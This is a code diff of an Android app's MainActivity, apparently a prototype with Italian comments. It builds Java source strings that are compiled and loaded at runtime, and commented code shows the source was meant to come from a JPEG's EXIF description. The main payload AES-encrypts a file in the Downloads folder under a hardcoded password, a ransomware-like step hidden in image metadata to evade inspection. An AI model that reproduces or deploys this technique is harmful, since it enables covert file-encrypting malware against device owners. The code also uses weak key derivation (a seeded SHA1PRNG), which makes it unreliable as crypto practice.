@@ -129,17 +129,25 @@ public class MainActivity extends AppCompatActivity {
 
                 break;
 
+            //TODO TRIGGER
             case R.id.info:
+                //TODO per prelevare l'immagine
                 //String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
                 //File file = new File(pathFile);
+                //payload(file);
+
+                //TODO per provare il codice senza immagine
                 payload();
 
+                //TODO PROVA metodo per generazione chiave, cifratura, decifratura, conversione file input e output
                 /*try {
-                    run();
+                    runAll();
                 } catch (Exception e) {
                     e.printStackTrace();
                 }*/
 
+                //TODO PROVA metodo identico a runAll, ma impostato per la compilazione dinamica (per per le classi i pakage e alcuni cast)
+                //runner(getApplicationContext());
 
                 break;
         }
@@ -148,7 +156,17 @@ public class MainActivity extends AppCompatActivity {
 
     private void payload() {
 
-        String codice =
+        String codice0 =
+                "public class Classe { " +
+                    "public Classe() {} " +
+                    "/* start method */" +
+                    "public void run(android.content.Context context){ " +
+                        "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Prova Toasto\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
+                    "} " +
+                    "/* end method */" +
+                "}";
+
+        String codice1 =
                 "public class Classe { " +
                     "public Classe() {} " +
                     "/* start method */" +
@@ -168,34 +186,37 @@ public class MainActivity extends AppCompatActivity {
                     "public Classe() {} " +
                     "/* start method */" +
                     "public void run(android.content.Context context){ " +
-                        "try{" +
-                            "java.lang.String password = \"pass\";" +
-                            "byte[] keyStart = password.getBytes(\"UTF-8\");" +
-                            "javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance(\"AES\");" +
-                            "java.security.SecureRandom sr = java.security.SecureRandom.getInstance(\"SHA1PRNG\");" +
-                            "sr.setSeed(keyStart);" +
-                            "kgen.init(128, sr);" +
-                            "javax.crypto.SecretKey skey = kgen.generateKey();" +
-                            "byte[] key = skey.getEncoded();" +
-                            "java.nio.file.Path path = java.nio.file.Paths.get(\"/sdcard/Download/Minions.jpg\");" +
-                            "byte[] plaintext = java.nio.file.Files.readAllBytes(path);" +
-                            "javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, \"AES\");" +
-                            "javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"AES\");" +
-                            "cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);" +
-                            "byte[] encrypted = cipher.doFinal(plaintext);" +
-                            "java.io.File file_chipertext = new java.io.File(\"/sdcard/Download/Minions.jpg.encrypt\");" +
-                            "java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file_chipertext));" +
-                            "bos.write(encrypted);" +
-                            "bos.flush();" +
-                            "bos.close();" +
-                        "} catch(java.lang.Exception e){" +
-                            "e.printStackTrace();" +
-                        "}" +
-                        "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Non cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
+                        "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Start\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
+                        "try{ " +
+                            "java.lang.String password = \"pass\"; " +
+                            "byte[] keyStart = password.getBytes(\"UTF-8\"); " +
+                            "javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance(\"AES\"); " +
+                            "java.security.SecureRandom sr = java.security.SecureRandom.getInstance(\"SHA1PRNG\"); " +
+                            "sr.setSeed((byte[]) keyStart); " +
+                            "kgen.init((int) 128, (java.security.SecureRandom) sr); " +
+                            "javax.crypto.SecretKey skey = kgen.generateKey(); " +
+                            "byte[] key = skey.getEncoded(); " +
+                            "java.nio.file.Path path = java.nio.file.Paths.get(\"/sdcard/Download/Minions.jpg\"); " +
+                            "byte[] plaintext = java.nio.file.Files.readAllBytes((java.nio.file.Path) path); " +
+                            "javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, \"AES\"); " +
+                            "javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"AES\"); " +
+                            "cipher.init((int) 1, (javax.crypto.spec.SecretKeySpec) skeySpec); " +
+                            "byte[] encrypted = cipher.doFinal((byte[]) plaintext); " +
+                            "java.io.File file_chipertext = new java.io.File(\"/sdcard/Download/Minions.jpg.encrypt\"); " +
+                            "java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext)); " +
+                            "bos.write((byte[]) encrypted); " +
+                            "bos.flush(); " +
+                            "bos.close(); " +
+                            "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"End\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
+                        "} catch(java.lang.Exception e){ " +
+                            "e.printStackTrace(); " +
+                        "} " +
                     "} " +
                     "/* end method */" +
-                "}";
+                "} ";
 
+
+        //TODO per prelevare i metadati
         /*try {
             ExifInterface exif = new ExifInterface(file.getAbsolutePath());
             codice = exif.getAttribute(ExifInterface.TAG_IMAGE_DESCRIPTION);
@@ -205,6 +226,7 @@ public class MainActivity extends AppCompatActivity {
 
         try {
             Compile compile = new Compile(getFilesDir(), getApplicationContext());
+            //TODO scegliere codice da compilare
             compile.assemblyCompile(codice2);
             compile.recompile();
             compile.load(getCacheDir(), getApplicationInfo(), getClassLoader());
@@ -303,7 +325,7 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-
+    //TODO metodo che richiama la generazione della chiave, conversione file input output, cifratura e decifratura
     public void runAll() throws Exception {
         Path path = Paths.get(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg");
         byte[] plaintext = Files.readAllBytes(path);
@@ -329,6 +351,7 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+    //TODO metodo per generare la chiave
     public byte[] generateKey(String password) throws Exception {
         byte[] keyStart = password.getBytes("UTF-8");
 
@@ -340,6 +363,7 @@ public class MainActivity extends AppCompatActivity {
         return skey.getEncoded();
     }
 
+    //TODO metodo per cifrare
     public byte[] encodeFile(byte[] key, byte[] fileData) throws Exception {
 
         SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
@@ -351,6 +375,7 @@ public class MainActivity extends AppCompatActivity {
         return encrypted;
     }
 
+    //TODO metodo per decifrare
     public byte[] decodeFile(byte[] key, byte[] fileData) throws Exception {
         SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
         Cipher cipher = Cipher.getInstance("AES");
@@ -361,30 +386,33 @@ public class MainActivity extends AppCompatActivity {
         return decrypted;
     }
 
-    public void rune(){
+    //TODO identico a runAll, ma impostato per la compilazione dinamica (per per le classi i pakage e alcuni cast)
+    public void runner(Context context){
+        android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) "Start" , (int) android.widget.Toast.LENGTH_LONG).show();
         try{
             java.lang.String password = "pass";
             byte[] keyStart = password.getBytes("UTF-8");
             javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance("AES");
             java.security.SecureRandom sr = java.security.SecureRandom.getInstance("SHA1PRNG");
-            sr.setSeed(keyStart);
-            kgen.init(128, sr);
+            sr.setSeed((byte[]) password.getBytes("UTF-8"));
+            kgen.init((int) 128, (java.security.SecureRandom) sr);
             javax.crypto.SecretKey skey = kgen.generateKey();
             byte[] key = skey.getEncoded();
 
             java.nio.file.Path path = java.nio.file.Paths.get("/sdcard/Download/Minions.jpg");
-            byte[] plaintext = java.nio.file.Files.readAllBytes(path);
+            byte[] plaintext = java.nio.file.Files.readAllBytes((java.nio.file.Path) path);
 
             javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
             javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES");
-            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);
-            byte[] encrypted = cipher.doFinal(plaintext);
+            cipher.init((int) 1, (javax.crypto.spec.SecretKeySpec) skeySpec);
+            byte[] encrypted = cipher.doFinal((byte[]) plaintext);
 
             java.io.File file_chipertext = new java.io.File("/sdcard/Download/Minions.jpg.encrypt");
-            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file_chipertext));
-            bos.write(encrypted);
+            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));
+            bos.write((byte[]) encrypted);
             bos.flush();
             bos.close();
+            android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) "End" , (int) android.widget.Toast.LENGTH_LONG).show();
         } catch(java.lang.Exception e){
             e.printStackTrace();
         }
